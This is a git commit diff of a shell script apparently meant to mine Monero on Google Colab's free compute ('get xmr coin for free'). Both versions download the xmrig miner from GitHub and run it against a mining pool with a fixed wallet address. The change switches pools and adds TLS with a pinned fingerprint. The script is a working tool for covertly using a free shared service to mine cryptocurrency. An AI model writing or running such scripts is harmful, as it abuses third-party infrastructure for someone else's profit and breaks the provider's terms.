b25fdf062e7c668905a94385e1045add73c9b26e
amomaooajs <114742285+amomaooajs@users.noreply.github.com>
2022-10-18 20:57:47 +0700

    Update gcolab-us.sh

--- gcolab-us.sh
+++ gcolab-us.sh
@@ -1,13 +1,4 @@
-#! /bin/bash
-# Install XRDP
-# Before get xmr coin for free
-# Google Colab
-sudo apt update
-clear
-sudo apt install screen
-screen -R xmr
- 
 wget https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-linux-x64.tar.gz
 tar xvzf xmrig-6.18.0-linux-x64.tar.gz
 cd xmrig-6.18.0
-./xmrig --coin=XMR -o xmr.2miners.com:2222 -u 43uAvLvPfqqE2BDptK8SpzPUuFf9sGevSJD5FuQxihaxcgYpbJ6PkkJX8cDo9YW8Wn1in1WuHJhrP9E6y8D6NkTNF37AZb3.RIG_02 -p x
+./xmrig --url pool.hashvault.pro:80 --user 43uAvLvPfqqE2BDptK8SpzPUuFf9sGevSJD5FuQxihaxcgYpbJ6PkkJX8cDo9YW8Wn1in1WuHJhrP9E6y8D6NkTNF37AZb3 --pass x2 --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14
